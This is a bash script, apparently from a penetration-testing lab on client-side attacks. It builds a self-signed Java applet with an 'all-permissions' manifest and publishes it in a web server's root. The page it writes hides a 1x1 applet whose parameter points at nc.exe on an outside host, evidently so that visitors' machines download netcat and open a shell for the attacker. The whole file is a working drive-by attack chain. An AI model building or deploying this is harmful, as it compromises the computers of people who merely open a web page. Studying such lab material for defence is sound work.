#!/bin/bash

rm -rf Java.class Java.jar SignedJava.jar manifest.txt mykeystore
javac -source 1.7 -target 1.7 Java.java &&
echo "Permissions: all-permissions" > /root/labs/tools/client-side-attacks/java-applet/manifest.txt &&
#jar cvfm Java.jar /root/labs/tools/client-side-attacks/java-applet/manifest.txt Java.class &&
jar cvf Java.jar Java.class
keytool -genkey -alias signapplet -keystore mykeystore -keypass password -storepass password &&
jarsigner -keystore mykeystore -storepass password -keypass password -signedjar SignedJava.jar Java.jar signapplet &&
echo 'OK' &&

rm -rf /var/www/html/Java.class &&
rm -rf /var/www/html/SignedJava.jar &&

cp Java.class /var/www/html &&
cp SignedJava.jar /var/www/html &&
echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.163:80/nc.exe"></applet>' > /var/www/html/java.html &&
echo 'ALL DONE'
